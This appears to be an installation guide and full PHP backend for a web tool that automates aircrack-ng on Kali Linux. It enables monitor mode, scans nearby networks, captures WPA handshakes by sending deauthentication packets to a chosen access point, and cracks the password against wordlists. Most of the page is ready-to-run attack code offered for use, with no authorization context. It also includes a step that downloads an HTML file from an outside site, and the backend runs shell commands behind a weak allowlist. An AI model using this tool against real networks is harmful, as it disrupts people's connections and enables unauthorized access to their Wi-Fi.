Aircrack-ng Automation Tool for Kali Linux
Key Implemented
Robust Monitor Mode Handling: Properly switches between managed and monitor modes using multiple methods
Interface Name Tracking: Automatically detects when interfaces change names (wlan0 → wlan0mon)
Driver-Specific Adjustments: Handles different wireless card drivers properly
Error Detection & Recovery: Identifies when monitor mode fails and attempts alternative methods
Detailed Logging: Shows what's happening at each step for easier troubleshooting


nstallation Instructions (Updated & Simplified)
Step 1: Create Directory Structure
Copy# Create a directory for the tool
mkdir -p ~/wifi-tool
cd ~/wifi-tool
Step 2: Download the Fixed Tool
Copy# Download the fixed HTML file
wget https://page.genspark.site/page/toolu_017nzNuNTZ6Pg1Rxo3ksYLqj/fixed_kali_aircrack_tool.html -O index.html

Step 3: Create Backend PHP Files
Create the main backend handler:

Copy# Create execute.php
cat > execute.php << 'EOF'
<?php
header('Content-Type: text/plain');

// Security: Restrict commands to specific aircrack tools
function isAllowedCommand($cmd) {
    $allowed_tools = array('airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'iwconfig', 'ifconfig', 'ip');
    foreach ($allowed_tools as $tool) {
        if (strpos($cmd, $tool) === 0) {
            return true;
        }
    }
    return false;
}

// Securely execute command with timeout
function execWithTimeout($cmd, $timeout = 10) {
    // Add timeout to prevent hanging
    $cmd = "timeout $timeout $cmd 2>&1";
    return shell_exec($cmd);
}

// Handle interface monitoring
if (isset($_POST['action']) && $_POST['action'] == 'monitor_start') {
    $interface = escapeshellarg($_POST['interface']);
    
    // First, check the current interface status
    $status = execWithTimeout("iwconfig $interface");
    echo "Initial interface status:\n$status\n\n";
    
    // Try multiple methods to ensure monitor mode is enabled
    
    // Method 1: Use airmon-ng to check for conflicting processes
    echo "Checking for conflicting processes...\n";
    execWithTimeout("airmon-ng check kill");
    
    // Method 2: First take down the interface
    echo "Taking down interface...\n";
    execWithTimeout("ip link set $interface down");
    
    // Method 3: Try direct airmon-ng start
    echo "Starting monitor mode with airmon-ng...\n";
    $result = execWithTimeout("airmon-ng start $interface");
    echo "$result\n\n";
    
    // Method 4: Check if we need manual mode setting
    echo "Checking if manual mode setting is needed...\n";
    $iwconfig = execWithTimeout("iwconfig");
    
    // Find the new monitor interface name (could be wlan0mon or similar)
    if (preg_match('/([a-zA-Z0-9]+mon)/', $iwconfig, $matches)) {
        $mon_interface = $matches[1];
        echo "Monitor interface detected as: $mon_interface\n";
    } else {
        // If no mon interface found, try manual method with original interface
        echo "No monitor interface detected, trying manual method...\n";
        execWithTimeout("iw $interface set monitor control");
        execWithTimeout("ip link set $interface up");
        $mon_interface = trim($_POST['interface'], "'\"");
        echo "Using original interface: $mon_interface in monitor mode\n";
    }
    
    // Final check to verify monitor mode
    $final_status = execWithTimeout("iwconfig $mon_interface");
    echo "Final interface status:\n$final_status\n";
    
    // Check if Mode:Monitor appears in the output
    if (strpos($final_status, "Mode:Monitor") !== false) {
        echo "\nSUCCESS: Monitor mode enabled!\n";
    } else {
        echo "\nWARNING: Could not confirm monitor mode. Please check the output above.\n";
    }
    
    // Return the monitor interface name for the frontend to use
    echo "\nMONITOR_INTERFACE:$mon_interface";
    exit;
}

// Handle scanning with proper error handling
if (isset($_POST['action']) && $_POST['action'] == 'scan') {
    $interface = escapeshellarg($_POST['interface']);
    
    // Create directory for output
    @mkdir("captures", 0777, true);
    $outputFile = "captures/scan_" . time();
    
    // Run airodump with a timeout to prevent hanging
    echo "Starting network scan on interface $interface...\n";
    echo "If you don't see networks appearing, please check:\n";
    echo "1. If your wireless card supports monitor mode\n";
    echo "2. If you have the correct drivers installed\n";
    echo "3. Try running 'sudo airmon-ng start $interface' directly in terminal\n\n";
    
    // Use a temporary file to store command output
    $cmd = "airodump-ng --output-format csv -w $outputFile $interface";
    echo "Executing: $cmd\n\n";
    
    // Run airodump briefly to capture networks
    execWithTimeout($cmd, 5);
    
    // Process the CSV to extract networks
    $csvFile = $outputFile . "-01.csv";
    if (file_exists($csvFile)) {
        echo "Scan completed. Processing results...\n\n";
        $networks = array();
        
        if (($handle = fopen($csvFile, "r")) !== FALSE) {
            $inClientSection = false;
            while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
                // Skip empty lines
                if (empty($data[0])) continue;
                
                // Check if we've reached the client section
                if (trim($data[0]) == "Station MAC") {
                    $inClientSection = true;
                    continue;
                }
                
                // Process only access points (not in client section)
                if (!$inClientSection && count($data) > 3) {
                    // Clean up the data
                    $bssid = trim($data[0]);
                    if (strlen($bssid) < 10) continue; // Skip header or invalid entries
                    
                    $network = array(
                        'bssid' => $bssid,
                        'power' => isset($data[3]) ? trim($data[3]) : "N/A",
                        'channel' => isset($data[5]) ? trim($data[5]) : "N/A",
                        'encryption' => isset($data[6]) ? trim($data[6]) : "N/A",
                        'ssid' => isset($data[13]) ? trim($data[13]) : "Hidden"
                    );
                    $networks[] = $network;
                }
            }
            fclose($handle);
            
            // Display networks as a table
            if (count($networks) > 0) {
                echo "Found " . count($networks) . " networks:\n\n";
                echo str_pad("BSSID", 20) . str_pad("Channel", 10) . str_pad("Power", 10) . 
                     str_pad("Encryption", 15) . "SSID\n";
                echo str_repeat("-", 80) . "\n";
                
                foreach ($networks as $network) {
                    echo str_pad($network['bssid'], 20) . 
                         str_pad($network['channel'], 10) . 
                         str_pad($network['power'], 10) . 
                         str_pad($network['encryption'], 15) . 
                         $network['ssid'] . "\n";
                }
            } else {
                echo "No networks found. Please check if your wireless adapter is properly in monitor mode.\n";
            }
        } else {
            echo "Error: Could not read scan results file.\n";
        }
        
        // Clean up
        @unlink($csvFile);
    } else {
        echo "Error: Scan did not produce results. This might indicate a problem with monitor mode.\n";
        echo "Debug info - Interface status:\n";
        echo execWithTimeout("iwconfig $interface");
    }
    exit;
}

// Handle handshake capture
if (isset($_POST['action']) && $_POST['action'] == 'capture') {
    $interface = escapeshellarg($_POST['interface']);
    $bssid = escapeshellarg($_POST['bssid']);
    $channel = escapeshellarg($_POST['channel']);
    $output = escapeshellarg($_POST['output']);
    
    // Ensure directory exists
    @mkdir("captures", 0777, true);
    
    // Set channel first
    echo "Setting channel $channel...\n";
    execWithTimeout("iwconfig $interface channel $channel");
    
    // Start airodump in background to capture handshake
    echo "Starting capture on $bssid (channel $channel)...\n";
    echo "Write to file: $output\n";
    
    $cmd = "airodump-ng --bssid $bssid -c $channel -w captures/$output $interface > /dev/null 2>&1 &";
    echo "Executing: $cmd\n";
    execWithTimeout($cmd, 2);
    
    // Wait briefly to ensure airodump has started
    sleep(2);
    
    // Start deauth in background
    echo "Sending deauthentication packets...\n";
    $deauth_cmd = "aireplay-ng --deauth 5 -a $bssid $interface > /dev/null 2>&1 &";
    echo "Executing: $deauth_cmd\n";
    execWithTimeout($deauth_cmd, 2);
    
    echo "Capture process started. The handshake will be saved to captures/$output-01.cap\n";
    echo "Wait at least 30 seconds for potential handshake capture.\n";
    echo "You must manually stop the capture when finished by clicking 'Stop Capture'.\n";
    exit;
}

// Handle stopping capture processes
if (isset($_POST['action']) && $_POST['action'] == 'stop_capture') {
    echo "Stopping all airodump-ng and aireplay-ng processes...\n";
    execWithTimeout("pkill airodump-ng");
    execWithTimeout("pkill aireplay-ng");
    
    echo "Capture stopped. Check the captures directory for .cap files.\n";
    
    // List captured files
    echo "Available capture files:\n";
    $files = glob("captures/*.cap");
    if (count($files) > 0) {
        foreach ($files as $file) {
            echo "- $file\n";
        }
    } else {
        echo "No capture files found.\n";
    }
    exit;
}

// Handle password cracking
if (isset($_POST['action']) && $_POST['action'] == 'crack') {
    $capfile = escapeshellarg($_POST['capfile']);
    $wordlist = escapeshellarg($_POST['wordlist']);
    
    echo "Starting password cracking...\n";
    echo "Using capture file: $capfile\n";
    echo "Using wordlist: $wordlist\n\n";
    
    $cmd = "aircrack-ng $capfile -w $wordlist";
    echo "Executing: $cmd\n\n";
    $result = execWithTimeout($cmd, 300); // Allow up to 5 minutes
    
    echo $result;
    exit;
}

// Handle turning off monitor mode
if (isset($_POST['action']) && $_POST['action'] == 'monitor_stop') {
    $interface = escapeshellarg($_POST['interface']);
    
    echo "Stopping all airodump and aireplay processes...\n";
    execWithTimeout("pkill airodump-ng");
    execWithTimeout("pkill aireplay-ng");
    
    echo "Disabling monitor mode...\n";
    $result = execWithTimeout("airmon-ng stop $interface");
    echo "$result\n\n";
    
    // Try alternative methods if needed
    echo "Checking interface status...\n";
    $status = execWithTimeout("iwconfig");
    echo "$status\n\n";
    
    // Get all interfaces
    $interfaces = array();
    if (preg_match_all('/^([a-zA-Z0-9]+)/', $status, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $interfaces[] = $match[1];
        }
    }
    
    // If original interface (without mon) exists, set it up
    $orig_interface = str_replace('mon', '', trim($_POST['interface'], "'\""));
    if (in_array($orig_interface, $interfaces)) {
        echo "Restoring original interface $orig_interface...\n";
        execWithTimeout("ip link set $orig_interface down");
        execWithTimeout("iw $orig_interface set type managed");
        execWithTimeout("ip link set $orig_interface up");
        
        // Check final status
        $final = execWithTimeout("iwconfig $orig_interface");
        echo "Final status of $orig_interface:\n$final\n";
    } else {
        echo "Could not find original interface to restore. You may need to manually restore network settings.\n";
    }
    
    exit;
}

// Handle listing available interfaces
if (isset($_POST['action']) && $_POST['action'] == 'list_interfaces') {
    echo "Detecting wireless interfaces...\n\n";
    
    // Use iw to list all wireless interfaces
    $iw_output = execWithTimeout("iw dev");
    echo "iw dev output:\n$iw_output\n\n";
    
    // Also check iwconfig
    $iwconfig_output = execWithTimeout("iwconfig");
    echo "iwconfig output:\n$iwconfig_output\n\n";
    
    // Extract interfaces
    $interfaces = array();
    
    // Parse iw output for interface names
    if (preg_match_all('/Interface\s+([a-zA-Z0-9]+)/', $iw_output, $matches)) {
        $interfaces = array_merge($interfaces, $matches[1]);
    }
    
    // Also parse iwconfig output
    if (preg_match_all('/^([a-zA-Z0-9]+)/', $iwconfig_output, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            if (strpos($iwconfig_output, $match[1] . '     no wireless')) {
                continue; // Skip non-wireless interfaces
            }
            if (!in_array($match[1], $interfaces)) {
                $interfaces[] = $match[1];
            }
        }
    }
    
    if (count($interfaces) > 0) {
        echo "\nDetected wireless interfaces:\n";
        foreach ($interfaces as $interface) {
            echo "- $interface\n";
        }
    } else {
        echo "\nNo wireless interfaces detected. Please check if your wireless adapter is connected and drivers are loaded.\n";
    }
    
    exit;
}

// Handle listing available wordlists
if (isset($_POST['action']) && $_POST['action'] == 'list_wordlists') {
    echo "Scanning for wordlists...\n\n";
    
    // Common wordlist locations
    $locations = array(
        '/usr/share/wordlists/',
        '/usr/share/john/',
        '/usr/share/dirb/'
    );
    
    $found = false;
    foreach ($locations as $location) {
        if (is_dir($location)) {
            echo "Wordlists in $location:\n";
            $result = execWithTimeout("find $location -type f -name '*.txt' -o -name '*.lst' | sort");
            if (trim($result) !== '') {
                echo "$result\n";
                $found = true;
            } else {
                echo "No wordlists found in this location.\n";
            }
        }
    }
    
    // Special handling for rockyou.txt which might be compressed
    if (file_exists('/usr/share/wordlists/rockyou.txt.gz') && !file_exists('/usr/share/wordlists/rockyou.txt')) {
        echo "\nNOTE: rockyou.txt is compressed. You can extract it with:\n";
        echo "sudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n";
    }
    
    if (!$found) {
        echo "No standard wordlists found. Consider installing some with:\n";
        echo "sudo apt-get install wordlists\n";
    }
    
    exit;
}

// Handle generic command execution (with security restrictions)
if (isset($_POST['command'])) {
    $command = trim($_POST['command']);
    
    // Security check
    if (!isAllowedCommand($command)) {
        echo "Error: Command not allowed for security reasons.";
        exit;
    }
    
    // Execute the allowed command
    echo execWithTimeout($command);
    exit;
}

echo "Error: No valid action specified";
?>
EOF
Step 4: Create Script to Run the Web Server
Copy# Create run.sh script
cat > run.sh << 'EOF'
#!/bin/bash
echo "Starting WiFi Hacking Automation Tool..."
echo "Open your browser and go to: http://localhost:8000"
php -S localhost:8000
EOF

# Make it executable
chmod +x run.sh
Step 5: Run the Tool
Copy# Start the tool
cd ~/wifi-tool
./run.sh
Step-by-Step Usage Instructions
1. Start the Tool
Copycd ~/wifi-tool
./run.sh
Then open your browser and navigate to: http://localhost:8000

2. Fix for Monitor Mode Issues
This version implements multiple methods to properly enable monitor mode:

First, it uses airmon-ng check kill to stop interfering processes
Then it brings down the interface with ip link set wlan0 down
Next it tries the standard airmon-ng start wlan0 command
If that fails, it tries the manual method with iw wlan0 set monitor control
Finally, it verifies if monitor mode is properly enabled
3. Scanning Networks
The improved scanning function:

Properly detects interface name changes (wlan0 → wlan0mon)
Uses timeout controls to prevent hanging
Provides detailed feedback if scanning fails
Shows real-time debug information
4. Handshake Capture & Password Cracking
Select your target network from the scan
Set channel and BSSID automatically
Start capture with deauthentication
Wait for the handshake (should appear within 30 seconds)
Use the password cracking function with your selected wordlist
Troubleshooting
If you still experience issues:

Check Driver Support:

Copy# List your wireless adapter
sudo lshw -C network
Look for your wireless adapter's driver information.

Verify Monitor Mode Support:

Copy# Check capabilities
iw list | grep -A 10 "Supported interface modes"
Make sure "monitor" is listed.

Manual Monitor Mode Test:

Copy# Try manual commands
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
# Check result
iwconfig wlan0
Look for "Mode:Monitor" in the output.
